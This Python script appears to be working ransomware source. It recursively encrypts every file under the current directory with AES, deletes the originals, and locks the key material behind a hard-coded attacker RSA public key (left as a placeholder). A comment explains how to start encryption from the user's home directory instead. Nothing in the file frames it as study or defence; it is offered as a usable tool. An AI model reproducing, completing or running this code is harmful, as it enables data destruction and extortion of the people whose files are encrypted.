from Crypto.Cipher import AES, PKCS1_OAEP
import os, random, sys
import struct
import shutil
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from base64 import b64decode,b64encode
from pathlib import Path

def encrypt(key,path):

    os.chdir(path)
    files=os.listdir('.')
    #print(files)
    for fil in files:
        if os.path.isdir(f"{fil}"):
            path1=f"{path}/{fil}"
            encrypt(key,path1)
            os.chdir(f"{path}")
            continue
        filn = fil.split('.')
        if (len(fil)<=10 or fil[-10:]!='.encrypted') and fil!='aese' and fil!='aese.exe' and fil!='aesd.py' and fil!='receiver.pem' and fil!='key.key' and fil!='key1.key' and fil!='aese.py' and fil!='private_pem.encrypted':

            #iv = os.urandom(16)
            iv = get_random_bytes(16)
            aes = AES.new(key, AES.MODE_CBC, iv)

            input_file = f"{fil}"
            filen = fil.replace('.','_')
            output_file = f"{filen}.encrypted"
	
            fsz = os.path.getsize(input_file)
	
            with open(output_file, 'wb') as fout:
                fout.write(struct.pack('<Q', fsz))
                fout.write(iv)
            
                sz = 2048

                with open(input_file,'rb') as fin:
                    while True:
                        chunk = fin.read(sz)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - len(chunk) % 16)
                        
                        fout.write(aes.encrypt(chunk))

            os.remove(f"{fil}")


home = str(Path.home())
#os.chdir(home) -------> uncomment this to start encryption from the home directory or 
			#else the script encrypts from the directory where the script is present 
	

key = get_random_bytes(16)

#generating rsa private key
keyrsa = RSA.generate(2048)
private_key = keyrsa.exportKey('PEM')
file_out = open("private.pem", "wb")
file_out.write(private_key)
#generating rsa public key
public_key = keyrsa.publickey().exportKey('PEM')
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

recipient_key = RSA.import_key(open("receiver.pem").read())
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_session_key = cipher_rsa.encrypt(key)

file = open('key.key', 'wb')
file.write(enc_session_key) # The key is type bytes still
file.close()

key1 = get_random_bytes(16)
iv1 = get_random_bytes(16)
aes1 = AES.new(key1, AES.MODE_CBC, iv1)
fsz = os.path.getsize("private.pem")
with open("private_pem.encrypted", 'wb') as fout:
    fout.write(struct.pack('<Q', fsz))
    fout.write(iv1)
            
    sz = 2048

    with open("private.pem",'rb') as fin:
        while True:
            chunk = fin.read(sz)
            if len(chunk) == 0:
                break
            elif len(chunk) % 16 != 0:
                chunk += b' ' * (16 - len(chunk) % 16)
                        
            fout.write(aes1.encrypt(chunk))

os.remove("private.pem")

spub=b"""your hard coded rsa public key"""

keypub = RSA.import_key(spub)
cipher_rsa1 = PKCS1_OAEP.new(keypub)
enc_cpriv_aes = cipher_rsa1.encrypt(key1)

file = open('key1.key', 'wb')
file.write(enc_cpriv_aes) # The key is type bytes still
file.close()

os.mkdir('README')
list1=["key.key","key1.key","receiver.pem","private_pem.encrypted"]
for i in list1:
    shutil.move(i,'README')


path=os.getcwd()
encrypt(key,path)

